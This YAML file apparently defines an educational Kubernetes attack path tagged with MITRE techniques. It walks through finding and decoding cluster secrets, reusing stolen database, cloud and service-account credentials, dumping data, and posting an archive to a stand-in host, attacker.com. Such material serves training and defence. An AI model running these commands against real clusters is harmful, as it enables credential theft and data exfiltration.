title: "Misconfigured Secrets Exposure"
description: "An attack path demonstrating how misconfigured secrets can lead to information disclosure"
category: "Information Disclosure"
kubernetesVersion: "1.0+"
mitreTechniques:
  - T1552
  - T1078
  - T1040
steps:
  - id: "secret-discovery"
    title: "Discover Exposed Secrets"
    description: |
      The attacker begins by discovering secrets that are exposed through various misconfigurations. Kubernetes secrets can be exposed through environment variables (visible to any process in the container), mounted volumes (accessible as files), or through misconfigured RBAC that allows listing secrets. Many developers unknowingly expose secrets by logging them, including them in error messages, or using overly permissive service accounts.
    type: initial
    command:
      - "# Check environment variables for secrets"
      - "env | grep -iE '(password|secret|key|token|api|credential)'"
      - "printenv"
      - ""
      - "# Look for mounted secret volumes"
      - "find /var/run/secrets -type f 2>/dev/null"
      - "ls -la /etc/secrets/ 2>/dev/null"
      - "find / -name '*.key' -o -name '*.pem' -o -name '*secret*' 2>/dev/null"
      - ""
      - "# Check if we can list secrets via API"
      - "kubectl get secrets"
      - "kubectl get secrets --all-namespaces"
      - ""
      - "# Look for secrets in configmaps (common mistake)"
      - "kubectl get configmaps -o yaml | grep -iE '(password|secret|key)'"
    connections:
      - "secret-extraction"
    mitreTechnique: T1552

  - id: "secret-extraction"
    title: "Extract Sensitive Information"
    description: |
      Once secrets are discovered, the attacker extracts the sensitive information they contain. Kubernetes secrets are base64 encoded (not encrypted), making them trivial to decode. The attacker collects API tokens, database credentials, TLS certificates, SSH keys, and any other sensitive data. This information will be used for lateral movement or direct access to external services.
    type: lateral
    command:
      - "# Decode a Kubernetes secret"
      - "kubectl get secret database-secret -o jsonpath='{.data.username}' | base64 -d"
      - "kubectl get secret database-secret -o jsonpath='{.data.password}' | base64 -d"
      - ""
      - "# Extract all data from a secret"
      - "kubectl get secret my-secret -o json | jq -r '.data | to_entries[] | \"\\(.key): \\(.value | @base64d)\"'"
      - ""
      - "# Read the default service account token"
      - "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
      - ""
      - "# Extract TLS certificates if mounted"
      - "cat /etc/tls/tls.crt"
      - "cat /etc/tls/tls.key"
      - ""
      - "# Look for AWS/GCP/Azure credentials"
      - "cat ~/.aws/credentials 2>/dev/null"
      - "echo $GOOGLE_APPLICATION_CREDENTIALS"
      - "env | grep -i azure"
    connections:
      - "credential-reuse"
    mitreTechnique: T1552

  - id: "credential-reuse"
    title: "Reuse Stolen Credentials"
    description: |
      The attacker uses the stolen credentials to access external services and resources. Database credentials provide access to backend databases. Cloud provider credentials (AWS, GCP, Azure) can give access to cloud resources outside the cluster. API keys might grant access to third-party services. The attacker tests each credential to determine what access it provides.
    type: privilege
    command:
      - "# Connect to database using stolen credentials"
      - "mysql -h $DB_HOST -u $DB_USER -p$DB_PASSWORD"
      - "psql postgres://$DB_USER:$DB_PASSWORD@$DB_HOST:5432/production"
      - ""
      - "# Use stolen AWS credentials"
      - "export AWS_ACCESS_KEY_ID=AKIA..."
      - "export AWS_SECRET_ACCESS_KEY=..."
      - "aws sts get-caller-identity"
      - "aws s3 ls"
      - ""
      - "# Use stolen service account token"
      - "curl -sk -H \"Authorization: Bearer $TOKEN\" https://$KUBERNETES_SERVICE_HOST/api/v1/secrets"
      - ""
      - "# Access external APIs with stolen keys"
      - "curl -H \"Authorization: Bearer $API_KEY\" https://api.example.com/v1/users"
    connections:
      - "data-access"
    mitreTechnique: T1078

  - id: "data-access"
    title: "Access Protected Data"
    description: |
      Using the stolen and validated credentials, the attacker gains unauthorized access to sensitive data and resources. This could include customer data in databases, files stored in cloud storage, internal APIs, or other critical systems. The attacker can read, modify, or exfiltrate this data depending on the permissions granted by the stolen credentials.
    type: exfiltration
    command:
      - "# Dump database contents"
      - "mysqldump -h $DB_HOST -u $DB_USER -p$DB_PASSWORD --all-databases > dump.sql"
      - "pg_dump -h $DB_HOST -U $DB_USER production > dump.sql"
      - ""
      - "# Download files from cloud storage"
      - "aws s3 sync s3://company-backups ./backups"
      - "gsutil cp -r gs://sensitive-data ./data"
      - ""
      - "# Access internal APIs"
      - "curl -H \"Authorization: Bearer $INTERNAL_TOKEN\" https://internal-api.svc.cluster.local/admin/users"
      - ""
      - "# Query secrets from HashiCorp Vault (if credentials found)"
      - "export VAULT_TOKEN=$STOLEN_TOKEN"
      - "vault kv get secret/production/database"
      - ""
      - "# Exfiltrate collected data"
      - "tar czf exfil.tar.gz dump.sql backups/"
      - "curl -X POST -F 'file=@exfil.tar.gz' https://attacker.com/upload"
    mitreTechnique: T1530
